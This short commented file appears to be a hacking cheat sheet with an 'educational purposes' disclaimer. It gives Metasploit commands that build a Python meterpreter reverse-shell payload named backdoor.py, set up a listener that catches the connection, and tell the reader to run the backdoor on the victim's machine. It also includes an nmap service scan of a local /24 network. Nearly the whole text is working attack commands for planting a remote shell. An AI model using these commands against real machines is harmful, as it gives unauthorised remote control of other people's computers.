# I AM NOT RESPONSABLE IF YOU DECIDE TO HACK AN UNAUTHORIZED SYSTEM!
# HACKING WITHOUT PERMISSION IS ILLEGAL AND CAN LEAD TO A SERIOUS PRISON SENTENCE!
# THIS IS FOR EDUCATIONAL PURPOSES!

# echo $(ifconfig | strings)

# [metasploit]
# msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=8080 > backdoor.py
# msfconsole
# >   [1] use exploit/multi/handler
# >   [2] set payload python/meterpreter/reverse_tcp
# >   [3] set lhost IP
# >   [4] set lport 8080
# >   [5] exploit

# [on the victim's machine]
# python3 backdoor.py

# [nmap]
# nmap -sV -A [IP OF THE LOCAL NETWORK]/24
